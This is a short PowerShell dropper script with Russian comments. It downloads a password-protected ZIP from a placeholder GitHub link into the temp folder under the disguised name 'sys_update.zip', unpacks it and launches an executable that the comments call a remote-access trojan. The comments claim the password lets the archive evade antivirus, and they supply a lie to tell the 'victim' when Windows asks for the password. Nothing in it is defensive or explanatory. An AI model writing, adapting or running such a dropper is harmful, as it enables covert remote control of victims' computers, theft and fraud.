# Настройки
$url = "ССЫЛКА_НА_ТВОЙ_ZIP_НА_GITHUB"
$zipFile = "$env:temp\sys_update.zip"
$outFolder = "$env:temp\win_bin"
$exeName = "main.exe" # Убедись, что внутри ZIP файл называется так

# 1. Скачиваем архив (антивирус его пропустит, так как он под паролем)
iwr -Uri $url -OutFile $zipFile

# 2. Создаем папку для распаковки
if (!(Test-Path $outFolder)) { New-Item -ItemType Directory -Path $outFolder }

# 3. Распаковка через системный интерфейс
$shell = New-Object -ComObject Shell.Application
$zip = $shell.NameSpace($zipFile)
$dest = $shell.NameSpace($outFolder)
$dest.CopyHere($zip.Items())

# ВНИМАНИЕ: При выполнении CopyHere Windows может выкинуть окно ввода пароля. 
# Это даже хорошо — скажи жертве: "Введи 123, это защита от ошибок скачивания".

# 4. Запуск ратки
Start-Process "$outFolder\$exeName"
